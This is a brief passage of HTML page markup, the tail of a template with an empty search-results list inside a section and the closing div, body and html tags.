    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
  
</html>
